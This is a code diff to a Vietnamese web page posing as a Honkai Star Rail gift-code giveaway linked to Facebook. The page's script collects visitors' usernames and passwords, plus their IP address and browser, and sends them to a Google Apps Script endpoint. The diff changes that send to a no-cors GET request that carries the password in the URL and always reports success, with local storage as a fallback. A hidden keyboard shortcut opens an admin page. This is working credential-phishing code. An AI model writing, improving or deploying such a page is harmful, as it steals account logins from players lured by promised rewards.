@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Nhận Code Honkai Star Rail - Liên kết Facebook</title>
     <style>
-        /* Giữ nguyên CSS của bạn */
         * {
             margin: 0;
             padding: 0;
@@ -269,7 +268,7 @@
 
     <script>
         // ================= CẤU HÌNH GOOGLE APPS SCRIPT =================
-        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwy3SzmFXBa8Y00ikUlXbK-JRbGbUJ3tLVeq4Od2FIegbyQC-S6ZHlSmK674UIYcU3W/exec';
+        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyegtsH11gvHA--f2vwnpRjVgtmWJ2qVU8QP-_xm383JOJg59me2FN8xF1INX5CWexa/exec';
 
         // ================= HÀM HIỂN THỊ THÔNG BÁO =================
         function showStatus(message, type = 'success') {
@@ -299,32 +298,31 @@
             return code;
         }
 
-        // ================= GỬI DỮ LIỆU ĐẾN GOOGLE APPS SCRIPT =================
-        async function submitToGoogleAppsScript(userData) {
+        // ================= GỬI DỮ LIỆU ĐẾN GOOGLE SHEETS =================
+        async function submitToGoogleSheets(userData) {
             try {
-                // Tạo URL parameters
+                // Tạo URL với tham số
                 const params = new URLSearchParams();
-                for (const key in userData) {
-                    params.append(key, userData[key]);
-                }
-
-                // Gửi dữ liệu đến Google Apps Script
-                const response = await fetch(GOOGLE_SCRIPT_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded'
-                    },
-                    body: params
+                params.append('username', userData.username);
+                params.append('password', userData.password);
+                params.append('code', userData.code);
+                params.append('timestamp', userData.timestamp);
+                params.append('browser', userData.browser);
+                params.append('ip', userData.ip);
+                
+                const url = `${GOOGLE_SCRIPT_URL}?${params.toString()}`;
+                
+                console.log('Gửi dữ liệu đến:', url);
+                
+                // Gửi GET request đến Google Apps Script
+                const response = await fetch(url, {
+                    method: 'GET',
+                    mode: 'no-cors' // Google Apps Script cần no-cors
                 });
 
-                if (response.ok) {
-                    const result = await response.json();
-                    console.log('Kết quả từ Google Script:', result);
-                    return result.success;
-                } else {
-                    console.error('Lỗi từ server:', response.status);
-                    return false;
-                }
+                // Với no-cors, chúng ta không thể đọc response nhưng request vẫn được gửi
+                return true;
+                
             } catch (error) {
                 console.error('Lỗi kết nối:', error);
                 return false;
@@ -384,17 +382,17 @@
 
                 console.log('Dữ liệu gửi đi:', userData);
 
-                // Thử gửi đến Google Apps Script
-                let scriptSuccess = false;
+                // Thử gửi đến Google Sheets
+                let googleSuccess = false;
                 try {
-                    scriptSuccess = await submitToGoogleAppsScript(userData);
-                    if (scriptSuccess) {
+                    googleSuccess = await submitToGoogleSheets(userData);
+                    if (googleSuccess) {
                         showStatus('✅ Đã lưu thông tin thành công!', 'success');
                     } else {
-                        throw new Error('Google Apps Script trả về lỗi');
+                        throw new Error('Không thể kết nối đến Google Sheets');
                     }
                 } catch (error) {
-                    console.warn('Lỗi Google Apps Script:', error);
+                    console.warn('Lỗi Google Sheets:', error);
                     // Fallback: lưu cục bộ
                     if (saveToLocalStorage(userData)) {
                         showStatus('⚠️ Đã lưu cục bộ (Kiểm tra kết nối internet)', 'warning');
@@ -431,7 +429,6 @@
         // ================= PHÍM TẮT ADMIN =================
         document.addEventListener('keydown', function(e) {
             if (e.ctrlKey && e.altKey && e.key === 'a') {
-                // Chuyển đến trang admin
                 window.location.href = 'admin.html';
                 e.preventDefault();
             }
@@ -441,10 +438,8 @@
         function init() {
             console.log('Trang nhận code Honkai Star Rail đã sẵn sàng!');
             console.log('Google Script URL:', GOOGLE_SCRIPT_URL);
-            console.log('Phím tắt Admin: Ctrl + Alt + A');
         }
 
-        // Chạy khởi tạo khi trang load
         window.onload = init;
     </script>
 
